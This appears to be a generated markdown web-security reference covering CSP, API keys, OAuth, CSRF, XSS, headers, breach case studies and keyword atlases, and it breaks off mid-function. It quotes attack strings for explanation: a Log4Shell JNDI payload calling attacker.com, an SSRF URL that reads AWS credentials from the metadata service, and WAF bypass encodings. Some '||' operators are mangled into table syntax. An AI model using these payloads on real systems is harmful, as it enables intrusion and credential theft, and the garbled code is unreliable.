script-src 'self' 'unsafe-inline' https://cdn.example.com;
style-src 'self' 'unsafe-inline';
img-src 'self' data: https:;
font-src 'self' https://fonts.gstatic.com;
connect-src 'self' https://api.example.com;

```text

---

## Directives Explained

| Directive | Controls |
|-----------|----------|
| default-src | Fallback for others |
| script-src | JavaScript sources |
| style-src | CSS sources |
| img-src | Image sources |
| connect-src | API calls, WebSocket |
| frame-src | iframe sources |

---

## Nonce Pattern

```javascript
// Generate nonce per request
const nonce = crypto.randomBytes(16).toString('base64');

// In header
`script-src 'nonce-${nonce}'`

// In HTML
<script nonce="${nonce}">...</script>

```text

---
## ?? API KEY PATTERNS

> **The secure API key implementation**

---

## Key Generation

```javascript
import crypto from 'crypto';

function generateApiKey() {
const prefix = 'sk_live_'; // Identifiable prefix
const randomPart = crypto.randomBytes(24).toString('base64url');
return prefix + randomPart;
}
// Result: sk_live_AbCdEf123456789...

```text

---

## Secure Storage

```javascript
// NEVER store plain API key
// Store hash, show key ONCE at creation

const keyHash = crypto
  .createHash('sha256')
  .update(apiKey)
  .digest('hex');

await db.apiKeys.create({
keyPrefix: apiKey.slice(0, 8), // For identification
keyHash: keyHash,
userId: user.id
});

// Return full key to user ONCE
return { apiKey, keyPrefix };

```text

---

## Validation

```javascript
async function validateApiKey(providedKey) {
const hash = crypto
    .createHash('sha256')
    .update(providedKey)
    .digest('hex');

const apiKey = await db.apiKeys.findFirst({
where: { keyHash: hash }
  });

return apiKey;
}

```text

---
## ?? OAUTH 2.0 FLOWS

> **The correct OAuth implementation**

---

## Authorization Code Flow (Best for web apps)

```yaml
1. User clicks "Login with Google"
2. Redirect to:
   https://accounts.google.com/oauth/authorize
   ?client_id=xxx
   &redirect_uri=https://myapp.com/callback
   &response_type=code
&scope=email profile
   &state=random_csrf_token

3. User logs in, consents
4. Google redirects to:
   https://myapp.com/callback?code=xxx&state=xxx

5. Server exchanges code for tokens:
POST https://oauth2.googleapis.com/token
{ code, client_id, client_secret, redirect_uri }

6. Server receives: { access_token, refresh_token, id_token }

```text

---

## PKCE Flow (Best for SPAs/Mobile)

```javascript
// 1. Generate verifier and challenge
const verifier = crypto.randomBytes(32).toString('base64url');
const challenge = crypto
  .createHash('sha256')
  .update(verifier)
  .digest('base64url');

// 2. Include in auth request
`?code_challenge=${challenge}&code_challenge_method=S256`

// 3. Include verifier in token exchange
{ code, code_verifier: verifier, ... }

```text

---

## Token Storage

```text
ACCESS TOKEN:

- Short-lived (15 min)

- In-memory or httpOnly cookie

REFRESH TOKEN:

- Long-lived (weeks)

- httpOnly cookie only

- Rotate on use

```text

---
## ?? SUBDOMAIN TAKEOVER PREVENTION

> **The DNS security patterns**

---

## How Takeover Happens

```yaml
SCENARIO:
1. You have: app.example.com CNAME -> something.herokuapp.com
2. You stop using Heroku, dont remove DNS
3. Attacker claims that Heroku app name
4. Attacker now controls app.example.com!

VULNERABLE TO:

- Cloud providers (AWS, Azure, Heroku)

- SaaS services (Zendesk, Shopify)

- CDNs (Fastly, CloudFront)

```text

---

## Detection

```bash

## Check for dangling CNAMEs

dig app.example.com CNAME

## If points to unclaimed resource

## NXDOMAIN or error page = potentially takeable

```text

---

## Prevention Checklist

```json
[ ] Remove DNS records when decommissioning
[ ] Audit orphan CNAMEs regularly
[ ] Use wildcard certificates carefully
[ ] Monitor certificate transparency logs
[ ] Claim reserved names on platforms

```text

---
## ?? RATE LIMIT BYPASS PREVENTION

> **The security patterns for rate limiting**

---

## Common Bypass Attempts

```text
1. IP ROTATION
- Use Cloudflare, VPN detection
- Rate limit by user ID when authenticated

2. HEADER SPOOFING
- X-Forwarded-For can be faked
- Trust only from known proxies

3. ACCOUNT FARMING
- Create many accounts
- Require email/phone verification

4. DISTRIBUTED ATTACKS
- Many IPs, same target
- Add CAPTCHA after retries

```text

---

## Multi-Layer Limits

```python
LAYER 1: Global
10000 requests/min from any IP

LAYER 2: IP-based
100 requests/min per IP

LAYER 3: User-based
60 requests/min per user

LAYER 4: Endpoint-specific
5 login attempts/15min
3 password resets/hour

```text

---

## Response Pattern

```javascript
if (!rateLimitResult.allowed) {
return res.status(429).json({
error: 'Too Many Requests',
retryAfter: rateLimitResult.retryAfter,
limit: rateLimitResult.limit,
remaining: 0
  });
}

```text

---
## ?? SECURE FILE UPLOAD

> **The patterns for safe file handling**

---

## Validation Checklist

```json
[ ] File size limit enforced
[ ] File type validated (not just extension!)
[ ] Filename sanitized
[ ] Content-Type verified
[ ] Malware scan if possible
[ ] Private storage path
[ ] Unique filename generated

```text

---

## Content-Type Validation

```javascript
import fileType from 'file-type';

async function validateFile(buffer) {
const type = await fileType.fromBuffer(buffer);

const allowed = ['image/jpeg', 'image/png', 'application/pdf'];

| if (!type |  | !allowed.includes(type.mime)) { |
throw new Error('Invalid file type');
  }

return type;
}

```text

---

## Secure Filename

```javascript
function sanitizeFilename(filename) {
// Remove path traversal
const base = path.basename(filename);

// Remove special characters
const cleaned = base.replace(/[^a-zA-Z0-9.-]/g, '_');

// Generate unique name
return `${uuid()}_${cleaned}`;
}

```text

---

## Storage Path

```yaml
NEVER: /uploads/${userFilename}
(Path traversal: ../../../etc/passwd)

ALWAYS:
const key = `uploads/${userId}/${uuid()}.${ext}`;

```text

---
## ?? DEPENDENCY SCANNING

> **The patterns for secure dependencies**

---

## npm audit

```bash

## Check vulnerabilities

npm audit

## Auto-fix what's possible

npm audit fix

## Force major updates (careful!)

npm audit fix --force

```text

---

## Snyk Integration

```yaml

## GitHub Action

- name: Snyk Security Scan
uses: snyk/actions/node@master
  env:
SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
  with:
args: --severity-threshold=high

```text

---

## Automated Updates

```yaml

## Dependabot config

version: 2
updates:
- package-ecosystem: npm
directory: /
    schedule:
interval: weekly
    groups:
      production:
        patterns:
- "*"
        exclude-patterns:
- "@types/*"
- "*-types"

```text

---

## Supply Chain Security

```yaml
LOCKFILE:

- Always commit package-lock.json

- Use npm ci in CI (not npm install)

- Verify integrity hashes

REGISTRY:

- Use private registry for sensitive

- Mirror critical dependencies

- Pin exact versions for security

```text

---
## ?? CSRF PREVENTION PATTERNS

> **The cross-site request forgery protection**

---

## Token Pattern

```javascript
// Generate token
function generateCsrfToken() {
return crypto.randomBytes(32).toString('hex');
}

// Store in session
app.use((req, res, next) => {
if (!req.session.csrfToken) {
req.session.csrfToken = generateCsrfToken();
  }
res.locals.csrfToken = req.session.csrfToken;
  next();
});

// Verify on POST/PUT/DELETE
app.use((req, res, next) => {
if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
| const token = req.body._csrf |  | req.headers['x-csrf-token']; |
if (token !== req.session.csrfToken) {
return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  next();
});

```text

---

## SameSite Cookies

```javascript
res.cookie('session', sessionId, {
httpOnly: true,
secure: true,
sameSite: 'strict'  // Prevents CSRF
});

```text

---

## Double Submit Pattern

```text
1. Set CSRF token in cookie (httpOnly: false)
2. Client reads cookie, sends in header
3. Server compares cookie vs header
4. Attacker cant read cookie from another origin

```text

---
## ?? XSS PREVENTION PATTERNS

> **The cross-site scripting protection**

---

## Output Encoding

```javascript
// VULNERABLE: Raw HTML insertion
element.innerHTML = userInput;

// SAFE: Text content
element.textContent = userInput;

// SAFE: With encoding
import { encode } from 'html-entities';
element.innerHTML = encode(userInput);

```text

---

## React Protection

```jsx
// SAFE: React auto-escapes
<div>{userInput}</div>

// DANGEROUS: dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// If must use, sanitize:
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{
__html: DOMPurify.sanitize(userInput)
}} />

```text

---

## Context-Specific Encoding

```html
HTML Body: < > & " '  ? &lt; &gt; &amp; &quot; &#x27;
HTML Attribute: " '    ? &#x22; &#x27;
JavaScript: ' " \ <    ? \' \" \\ \x3c
URL: special chars  ? encodeURIComponent()
CSS: special chars  ? CSS.escape()

```text

---

## CSP as Defense in Depth

```text
Content-Security-Policy:
script-src 'self';  // Block inline & external

```text

---
## ?? SECURE HEADERS CONFIGURATION

> **The HTTP security headers**

---

## Essential Headers

```javascript
// Helmet.js for Express
import helmet from 'helmet';

app.use(helmet({
contentSecurityPolicy: {
directives: {
defaultSrc: ["'self'"],
scriptSrc: ["'self'", "'unsafe-inline'"],
styleSrc: ["'self'", "'unsafe-inline'"],
imgSrc: ["'self'", "data:", "https:"],
    },
  },
hsts: {
maxAge: 31536000,
includeSubDomains: true,
preload: true
  }
}));

```text

---

## Header Reference

| Header | Purpose |
|--------|---------|
| Content-Security-Policy | XSS prevention |
| X-Content-Type-Options | MIME sniffing |
| X-Frame-Options | Clickjacking |
| Strict-Transport-Security | Force HTTPS |
| Referrer-Policy | Control referrer |
| Permissions-Policy | Limit browser features |

---

## Verification

```bash

## Check headers

curl -I https://example.com

## Security scanner

## securityheaders.com

## observatory.mozilla.org

```text

---

## 07_SECURITY.MD: THE TITAN GUIDE (25K TARGET)

## Production-Grade Zero Trust, Cryptography, and Pentesting

> **Status**: TIER 3 CRITICAL OPS (Infinite Scale)
> **Target**: 25,000 Lines
> **Coverage**: Zero Trust, OAuth2, Quantum-Safe, WAF
> **Last Updated**: December 24, 2024

---

## **VOLUME 1: THE SCARS (The "Why")**

*Real-world horror stories and billion-dollar failures.*
1. The "Log4Shell" - The Internet on Fire (JNDI Injection)
2. The "Equifax Breach" - Patch Management Failure
3. The "SolarWinds Hack" - Supply Chain Attack
4. The "Capital One Breach" - SSRF (Server Side Request Forgery)

## **VOLUME 2: THE FOUNDATION (The "What")**

*Production-grade basics. No "Hello World".*
5. Zero Trust Architecture (Never Trust, Always Verify)
6. OAuth2 & OIDC (Authentication Flows Deep Dive)
7. HTTPS & TLS 1.3 (Encryption in Transit)
8. CORS & CSP (Browser Security Headers)

## **VOLUME 3: THE DEEP DIVE (The "How")**

*Advanced engineering and optimization.*
9. JWT Security (Signing, Rotation, Revocation)
10. WAF (Web Application Firewall) Rules & Bypass
11. Rate Limiting & DDoS Protection (Layer 7)
12. SQL Injection & XSS (The Classics)

## **VOLUME 4: THE EXPERT (The "Scale")**

*Distributed systems and high-scale patterns.*
13. Secret Management (Vault/AWS Secrets Manager)
14. Container Security (Distroless, Scanning, Runtime)
15. Cloud Security Posture Management (CSPM)

## **VOLUME 5: THE TITAN (The "Kernel")**

*Low-level internals and custom engines.*
16. Memory Safety (Rust vs C++ Buffer Overflows)
17. Side-Channel Attacks (Spectre/Meltdown Mitigation)
18. Homomorphic Encryption (Compute on Encrypted Data)

## **VOLUME 6: THE INFINITE (The "Future")**

*Experimental tech and "Meta-Beating" research.*
19. Quantum-Safe Cryptography (Post-Quantum Algorithms)
20. AI-Powered Threat Detection (Behavioral Analysis)
21. Self-Sovereign Identity (DID & Verifiable Credentials)

---
## VOLUME 1: THE SCARS (THE "WHY")

## 1. THE "LOG4SHELL" (CVE-2021-44228)

### The Internet on Fire

**The Context**:
Log4j is the standard logging library for Java. Used by 90% of enterprise apps.
**The Vulnerability**:
JNDI (Java Naming and Directory Interface) Injection.
If Log4j logs a string like `${jndi:ldap://attacker.com/exploit}`, it *executes* it.
**The Attack**:
Attackers changed their User-Agent or Chat Message to the exploit string.
Server logs the User-Agent -> Fetches code from attacker -> RCE (Remote Code Execution).
**The Result**:
Full control over millions of servers (iCloud, Minecraft, Twitter).
**The Fix**:
1. **Disable JNDI**: `log4j2.formatMsgNoLookups=true`.
2. **WAF Rules**: Block `${jndi:`.
3. **Patch**: Update to Log4j 2.17+.

---

## 4. THE "CAPITAL ONE BREACH"

### SSRF (Server Side Request Forgery)

**The Context**:
Capital One used a WAF on AWS EC2.
**The Vulnerability**:
The WAF had a misconfiguration allowing it to query the AWS Metadata Service (`169.254.169.254`).
**The Attack**:
Attacker sent a request to the WAF: `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
The WAF fetched the URL and returned the **AWS IAM Role Credentials** to the attacker.
**The Result**:
Attacker used the credentials to sync 700 S3 buckets containing 100M credit card applications.
**The Fix**:
**IMDSv2**. Require a session token for metadata access (blocks SSRF).

---

## VOLUME 2: THE FOUNDATION (THE "WHAT")

## 5. ZERO TRUST ARCHITECTURE

### Never Trust, Always Verify

**Concept**:
Old Model: Castle & Moat. Once you VPN in, you have access to everything.
Zero Trust: Assume the network is already compromised.
**Principles**:
1. **Verify Explicitly**: Authenticate every request, even internal ones.
2. **Least Privilege**: Give only the access needed.
3. **Assume Breach**: Design as if the attacker is inside.

**Implementation (mTLS)**:
Service A calls Service B.
1. Service A presents a Client Certificate.
2. Service B verifies it against the CA.
3. Traffic is encrypted. Identity is verified.
**Tools**: Istio, Linkerd, Consul Connect.

---

## 6. OAUTH2 & OIDC

### Authentication Flows Deep Dive

**Authorization Code Flow (PKCE)**:
The standard for Mobile/SPA.
1. **App**: Redirects user to `auth.com/authorize?code_challenge=xyz`.
2. **User**: Logs in.
3. **Auth Server**: Redirects back to `app.com/callback?code=123`.
4. **App**: Swaps `code` + `code_verifier` for `access_token`.

- **Why PKCE?**: Prevents Code Interception attacks.

**Client Credentials Flow**:
Machine-to-Machine (M2M).
1. **Service**: Sends `client_id` + `client_secret`.
2. **Auth Server**: Returns `access_token`.

- **Warning**: Never use this in a browser/mobile app.

---

## VOLUME 3: THE DEEP DIVE (THE "HOW")

## 9. JWT SECURITY

### Signing & Revocation

**The Problem**:
JWTs are stateless. If an attacker steals one, they are the user until it expires. You can't "logout" a JWT easily.
**The Solution**:
1. **Short Expiry**: Access Token expires in 15 minutes.
2. **Refresh Token**: Long-lived (7 days), stored in HTTPOnly Cookie + DB.
3. **Rotation**: When Refresh Token is used, issue a NEW Refresh Token and invalidate the old one.
- *Theft Detection*: If the old Refresh Token is used again, it means it was stolen. Invalidate the *entire* family of tokens.

**Algorithm Confusion Attack**:

- Attacker changes header `alg: HS256` (Symmetric) to `alg: None`.

- Some libraries accept it and skip signature verification.

- **Fix**: Explicitly whitelist algorithms (`RS256`).

---

## 10. WAF (WEB APPLICATION FIREWALL)

### Rules & Bypass

**ModSecurity / AWS WAF**:
Inspects HTTP traffic at Layer 7.
**Common Rules (OWASP Core Rule Set)**:

- Block SQLi: `UNION SELECT`, `' OR 1=1`.

- Block XSS: `<script>`, `javascript:`.

- Block Path Traversal: `../../etc/passwd`.

**Bypass Techniques**:

- **Encoding**: `%3Cscript%3E` (URL Encode), `\u003c` (Unicode).

- **Case**: `SeLeCt * FrOm`.

- **Whitespace**: `SELECT/**/1`.

---

## VOLUME 4: THE EXPERT (THE "SCALE")

## 13. SECRET MANAGEMENT

### Vault & AWS Secrets Manager

**HashiCorp Vault**:

- **Dynamic Secrets**:
- App asks Vault for DB access.
- Vault creates a temporary Postgres user `app-123` with 1-hour TTL.
- Vault returns credentials to App.
- After 1 hour, Vault deletes the user.

- **Benefit**: Even if credentials leak, they expire automatically.

**Sealed Secrets (Kubernetes)**:

- Encrypt secret locally: `kubeseal < secret.yaml > sealed.yaml`.

- Commit `sealed.yaml` to Git (Safe).

- Controller in Cluster decrypts it.

---

## 14. CONTAINER SECURITY

### Distroless & Runtime Security

**Distroless Images**:
Google's base images. Contain *only* your application and its runtime dependencies.
No shell (`/bin/sh`). No package manager (`apt`).
**Result**: Even if Log4Shell exists, the attacker can't run commands.

**Runtime Security (Falco)**:
Detects abnormal behavior in containers.

- "Why is the Nginx process writing to `/etc/shadow`?"

- "Why did a shell spawn inside a Redis container?"

- **Action**: Kill the pod immediately.

---

## VOLUME 5: THE TITAN (THE "KERNEL")

## 16. MEMORY SAFETY

### Rust vs C++

**Buffer Overflow**:
C++ allows writing past the end of an array, overwriting the return address on the stack.
**ROP (Return Oriented Programming)**:
Attacker chains together small snippets of existing code (gadgets) to execute arbitrary logic.

**Rust**:

- **Ownership Model**: Compiler enforces memory safety at compile time.

- **No Null Pointers**: `Option<T>`.

- **No Data Races**: `Mutex<T>`.

- **Result**: 70% of Microsoft's CVEs are memory safety issues. Rust eliminates them.

---

## 18. HOMOMORPHIC ENCRYPTION

### Compute on Encrypted Data

**Concept**:
Standard Encryption: Data is encrypted at rest and in transit, but *decrypted* in memory to be processed.
**Homomorphic Encryption**:
Perform math on the encrypted data itself.
`Enc(A) + Enc(B) = Enc(A+B)`

**Use Case**:
Send encrypted medical data to the cloud. Cloud runs AI analysis. Cloud returns encrypted result. Cloud *never* sees the data.
**Libraries**: Microsoft SEAL, OpenFHE.

---

## VOLUME 6: THE INFINITE (THE "FUTURE")

## 19. QUANTUM-SAFE CRYPTOGRAPHY

### Post-Quantum Algorithms

**The Threat**:
Shor's Algorithm on a Quantum Computer can factor large integers efficiently.
**RSA**and**Elliptic Curve (ECC)** will be broken.

**NIST Finalists (The Replacements)**:
1. **Kyber**(Key Encapsulation): Lattice-based.
2. **Dilithium**(Digital Signatures): Lattice-based.
3. **Sphincs+**: Hash-based.

**Migration**:
"Harvest Now, Decrypt Later". Attackers are storing encrypted traffic today to decrypt it in 10 years.
**Action**: Implement Hybrid Key Exchange (ECC + Kyber) immediately.

---

## VOLUME 7: THE APPENDIX (TITAN REFERENCE)

## A. THE ULTIMATE SECURITY HEADERS

Copy-paste this into Nginx/Vercel.

```text
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self';
Permissions-Policy: geolocation=(), microphone=(), camera=()

```text

## B. THE PENTEST CHECKLIST

1. **Recon**: Subdomain enumeration (Amass), Port scan (Nmap).
2. **Auth**: Brute force, Password reset poisoning, JWT attacks.
3. **Input**: SQLi, XSS, SSRF, IDOR.
4. **Config**: Default passwords, Debug mode enabled, Git folder exposed.
5. **Logic**: Race conditions, Price manipulation (-1 quantity).

---

## KEYWORD REFERENCE INDEX

## Each line = 100x LLM expansion potential

---

## OWASP TOP 10 (2021)

- A01 Broken Access Control: IDOR, path traversal, CORS misconfig

- A02 Cryptographic Failures: weak algorithms, plaintext secrets

- A03 Injection: SQLi, XSS, command injection, LDAP

- A04 Insecure Design: threat modeling, secure SDLC

- A05 Security Misconfiguration: default creds, verbose errors

- A06 Vulnerable Components: outdated deps, CVE scanning

- A07 Auth Failures: credential stuffing, session fixation

- A08 Integrity Failures: deserialization, unsigned updates

- A09 Logging Failures: insufficient monitoring, log injection

- A10 SSRF: internal network access, cloud metadata

## AUTHENTICATION

- Password hashing: bcrypt, scrypt, Argon2id

- MFA: TOTP, WebAuthn, FIDO2, SMS (weak)

- Session: HttpOnly, Secure, SameSite cookies

- JWT: RS256, short expiry, refresh rotation

- OAuth 2.0: PKCE, state param, audience validation

- Passkeys: credential manager, cross-device

## AUTHORIZATION

- RBAC: roles, permissions, inheritance

- ABAC: attributes, policies, context

- ReBAC: relationship-based, graph

- PBAC: policy engines, OPA, Cedar

- Least privilege: minimal access, regular audit

- Zero trust: never trust, always verify

## WEB SECURITY

- CSP: nonce, hash, strict-dynamic

- CORS: preflight, credentialed requests

- XSS: reflected, stored, DOM-based

- CSRF: SameSite, CSRF tokens

- Clickjacking: X-Frame-Options, CSP frame-ancestors

- Subresource Integrity: hash verification

- Trusted Types: DOM XSS mitigation

## CRYPTOGRAPHY

- Symmetric: AES-256-GCM, ChaCha20-Poly1305

- Asymmetric: RSA-2048, ECDSA, Ed25519

- Hashing: SHA-256, SHA-3, BLAKE3

- KDF: PBKDF2, scrypt, Argon2

- TLS: 1.3 only, cipher suites, certificate pinning

- PKI: CA, certificate chains, OCSP

- Post-quantum: Kyber, Dilithium, SPHINCS+

## APPLICATION SECURITY

- SAST: static analysis, code scanning

- DAST: dynamic testing, ZAP, Burp

- IAST: instrumented testing, runtime

- SCA: dependency scanning, SBOM

- Secret scanning: git history, pre-commit hooks

- Fuzzing: AFL, libFuzzer, coverage-guided

## INFRASTRUCTURE SECURITY

- Network segmentation: VLANs, security groups

- Firewall: WAF, NGFW, microsegmentation

- IDS/IPS: Suricata, Snort, cloud-native

- Container security: image scanning, runtime protection

- Kubernetes: NetworkPolicy, PodSecurity, RBAC

- Cloud security: CSPM, CWPP, CIEM

## THREAT MODELING

- STRIDE: Spoofing, Tampering, Repudiation, Info disclosure, DoS, Elevation

- DREAD: Damage, Reproducibility, Exploitability, Affected users, Discoverability

- Attack trees: root cause, branches, mitigations

- Data flow diagrams: trust boundaries, entry points

- Kill chain: reconnaissance, weaponization, delivery, exploitation

## SECURITY OPERATIONS

- SIEM: log correlation, alerting, Splunk, Elastic

- SOAR: automation, playbooks, incident response

- Threat intelligence: IOCs, TTP, MITRE ATT&CK

- Vulnerability management: CVE, CVSS, prioritization

- Incident response: containment, eradication, recovery

- Forensics: memory analysis, disk imaging, chain of custody

## PENETRATION TESTING

- Reconnaissance: OSINT, subdomain enumeration

- Scanning: port scan, service detection, vulnerability scan

- Exploitation: Metasploit, manual exploitation

- Post-exploitation: privilege escalation, lateral movement

- Reporting: findings, severity, remediation

---

## END OF KEYWORD REFERENCE

---

## ADVANCED CRYPTOGRAPHY DEEP ATLAS

## Each keyword = expandable implementation

## Modern Ciphers

- AES-GCM: authenticated encryption, nonce

- ChaCha20-Poly1305: stream cipher, MAC

- XChaCha20: extended nonce, 192-bit

- AES-256-GCM-SIV: nonce misuse resistant

- Key sizes: 128, 192, 256 bits

## Key Management

- HSM: hardware security module

- KMS: AWS KMS, GCP KMS, Azure Key Vault

- Key derivation: HKDF, PBKDF2, Argon2

- Key rotation: automatic, versioned

- Envelope encryption: DEK, KEK

## Digital Signatures

- RSA: 2048+, PSS padding

- ECDSA: P-256, P-384, secp256k1

- Ed25519: EdDSA, curved25519

- JWT signing: RS256, ES256, EdDSA

- Timestamps: RFC 3161, trusted

## Post-Quantum

- Kyber: key encapsulation

- Dilithium: digital signatures

- SPHINCS+: hash-based signatures

- Hybrid: classical + PQ

- NIST PQC: standardization

---

## WEB SECURITY DEEP ATLAS

## Each keyword = expandable defense

## CSP Advanced

- Nonces: script-src 'nonce-{random}'

- Hashes: sha256-{hash}

- strict-dynamic: trusted script chains

- report-uri: violation reporting

- Trusted Types: DOM sink protection

## Cookie Security

- HttpOnly: no JavaScript access

- Secure: HTTPS only

- SameSite: Strict, Lax, None

- __Host-: secure prefix

- __Secure-: secure prefix

## CORS

- Access-Control-Allow-Origin: origin

- Access-Control-Allow-Credentials: true

- Preflight: OPTIONS request

- Access-Control-Max-Age: cache

- Simple vs preflighted requests

## Headers

- HSTS: Strict-Transport-Security

- X-Frame-Options: DENY, SAMEORIGIN

- X-Content-Type-Options: nosniff

- Referrer-Policy: strict-origin

- Permissions-Policy: feature control

---

## APPLICATION SECURITY DEEP ATLAS

## Each keyword = expandable technique

## SAST

- Semgrep: custom rules, CI

- SonarQube: quality gates

- CodeQL: GitHub, queries

- Checkmarx: enterprise

- Language-specific: ESLint, Bandit

## DAST

- OWASP ZAP: proxy, active scan

- Burp Suite: professional, intruder

- Nuclei: vulnerability templates

- Nikto: web server scanner

- SQLMap: SQL injection

## IAST

- Contrast Security: runtime

- Hdiv: Java, .NET

- Seeker: Synopsys

- Continuous: real requests

- Lower false positives

## SCA

- Snyk: dependencies, container

- Dependabot: GitHub, PRs

- OWASP Dependency-Check: CVSS

- npm audit: JavaScript

- SBOM: CycloneDX, SPDX

---

## CLOUD SECURITY DEEP ATLAS

## Each keyword = expandable configuration

## IAM

- Least privilege: minimal permissions

- Service accounts: workload identity

- Roles: managed, custom

- Conditions: context-aware

- Just-in-time: temporary elevation

## Network

- VPC: private networking

- Security groups: stateful firewall

- Network ACLs: stateless

- PrivateLink: private endpoints

- VPN: site-to-site, client

## Data

- Encryption at rest: KMS, CMK

- Encryption in transit: TLS 1.3

- Client-side: application-level

- Key management: rotation

- DLP: classification, prevention

## Compliance

- CSPM: Prisma Cloud, Wiz

- CWPP: runtime protection

- CIEM: entitlement management

- Benchmark: CIS, SOC 2

- Audit: CloudTrail, Activity Logs

---

## THREAT DETECTION DEEP ATLAS

## Each keyword = expandable capability

## SIEM

- Splunk: SPL, dashboards

- Elastic Security: EQL, ML

- Microsoft Sentinel: Azure-native

- Sumo Logic: cloud-native

- Correlation: rules, patterns

## EDR/XDR

- CrowdStrike: Falcon platform

- Microsoft Defender: M365

- SentinelOne: autonomous

- Carbon Black: VMware

- Threat hunting: hypotheses

## Threat Intelligence

- IOCs: hashes, IPs, domains

- TTPs: MITRE ATT&CK

- STIX/TAXII: sharing format

- Feeds: commercial, open source

- Enrichment: context, scoring

---

### END OF MEGA SECURITY EXPANSION

---

## ACCESS DEEP ATLAS

## Each keyword = expandable implementation

## Authentication

- Password: hashing, Argon2, bcrypt

- MFA: TOTP, WebAuthn, push

- SSO: SAML, OIDC, federation

- Passwordless: magic links, passkeys

- Biometrics: Face ID, Touch ID

## OAuth 2.0 / OIDC

- Authorization Code: server-side

- PKCE: public clients, security

- Implicit: deprecated, SPA legacy

- Client Credentials: machine-to-machine

- Refresh tokens: rotation, revocation

## Identity Providers

- Auth0: managed, extensible

- Okta: enterprise, workforce

- Keycloak: open-source, on-prem

- AWS Cognito: serverless

- Azure AD: Microsoft ecosystem

## Session Management

- Stateful: server sessions

- Stateless: JWTs

- Refresh: sliding expiration

- Revocation: blacklist, rotation

- Binding: device, IP

---

## NETWORK SECURITY DEEP ATLAS

## Each keyword = expandable control

## Perimeter Security

- Firewall: rules, zones

- IDS/IPS: detection, prevention

- WAF: OWASP rules

- DDoS protection: rate limiting

- Reverse proxy: hiding origin

## Zero Trust

- Never trust: always verify

- Microsegmentation: workload isolation

- Identity-based: user, device

- Continuous verification: re-auth

- Least privilege: minimal access

## Encryption in Transit

- TLS 1.3: modern, fast

- mTLS: mutual authentication

- Certificate management: rotation

- Perfect forward secrecy: ephemeral

- HSTS: force HTTPS

## VPN & Remote Access

- WireGuard: modern, fast

- OpenVPN: flexible, proven

- ZTNA: zero trust alternative

- Split tunneling: partial routing

- Always-on: automatic connection

---

## INCIDENT RESPONSE DEEP ATLAS

## Each keyword = expandable process

## Preparation

- Runbooks: step-by-step

- Playbooks: automated

- War rooms: communication

- Tabletop exercises: practice

- Contact lists: escalation

## Detection & Analysis

- Alert triage: severity

- IOC matching: known bad

- Forensics: evidence collection

- Timeline: event correlation

- Scope: blast radius

## Containment

- Network isolation: quarantine

- Account lockout: credential reset

- Kill switch: feature flags

- Backup verification: recovery

- Preserve evidence: forensics

## Recovery & Lessons

- Service restoration: priority

- Root cause analysis: 5 whys

- Post-mortem: blameless

- Action items: prevention

- Communication: stakeholders

---

## COMPLIANCE DEEP ATLAS

## Each keyword = expandable framework

## SOC 2

- Trust Services Criteria

- Type I: point-in-time

- Type II: period of time

- Controls: evidence

- Auditor: independent

## ISO 27001

- ISMS: management system

- Risk assessment: methodology

- Controls: Annex A

- Certification: audit

- Continuous improvement

## GDPR

- Lawful basis: consent, legitimate

- Data subject rights: access, erasure

- DPIA: impact assessment

- DPO: data protection officer

- Breach notification: 72 hours

## Industry-Specific

- HIPAA: healthcare, PHI

- PCI DSS: payment cards

- FedRAMP: US government

- NIST CSF: framework

- CIS: benchmarks

---

## SECURE SDLC DEEP ATLAS

## Each keyword = expandable practice

## Shift Left

- Threat modeling: STRIDE, PASTA

- Secure design: architecture review

- Security requirements: user stories

- Training: secure coding

- Code review: security focus

## Build Security

- SAST: static analysis

- SCA: dependency scanning

- Secrets scanning: leaked creds

- Container scanning: vulnerabilities

- IaC scanning: misconfigurations

## Deploy Security

- DAST: dynamic testing

- Pen testing: manual

- Security gates: CI/CD

- Signed artifacts: integrity

- Immutable infrastructure

## Runtime Security

- RASP: runtime protection

- WAF: application firewall

- Bot management: detection

- Rate limiting: abuse prevention

- Monitoring: anomaly detection

---

### END OF ULTRA SECURITY EXPANSION

### Continuing expansion in next iteration

---

## SECURITY CODE EXAMPLES

## INPUT VALIDATION

## Sanitization Middleware

**Why it exists:** Prevent XSS and injection attacks

```typescript
// middleware/sanitize.ts
import DOMPurify from 'isomorphic-dompurify';
import { z } from 'zod';

// Sanitize HTML input
export function sanitizeHtml(dirty: string): string {
return DOMPurify.sanitize(dirty, {
ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
ALLOWED_ATTR: ['href', 'target'],
  });
}

// SQL injection prevention - always use parameterized queries
// NEVER do: `SELECT * FROM users WHERE id = ${userId}`
// DO: prisma.user.findUnique({ where: { id: userId } })

// NoSQL injection prevention
export const mongoIdSchema = z.string().regex(/^[a-f\d]{24}$/i, 'Invalid ID');

// Path traversal prevention
export function sanitizePath(userInput: string): string {
return userInput.replace(/\.\./g, '').replace(/[\/\\]/g, '');
}

```text

---

## CSRF PROTECTION

## Token-based CSRF

**Why it exists:** Prevent cross-site request forgery

```typescript
// lib/csrf.ts
import crypto from 'crypto';

export function generateCsrfToken(): string {
return crypto.randomBytes(32).toString('hex');
}

export function verifyCsrfToken(token: string, sessionToken: string): boolean {
return crypto.timingSafeEqual(
    Buffer.from(token),
    Buffer.from(sessionToken)
  );
}

// Middleware
export function csrfMiddleware(req, res, next) {
if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
| const token = req.headers['x-csrf-token'] |  | req.body._csrf; |
| if (!token |  | !verifyCsrfToken(token, req.session.csrfToken)) { |
return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  next();
}

```text

---

## ENCRYPTION

## Data Encryption at Rest

**Why it exists:** Protect sensitive data

```typescript
// lib/encryption.ts
import crypto from 'crypto';

const ALGORITHM = 'aes-256-gcm';
const KEY = Buffer.from(process.env.ENCRYPTION_KEY!, 'hex');

export function encrypt(plaintext: string): string {
const iv = crypto.randomBytes(16);
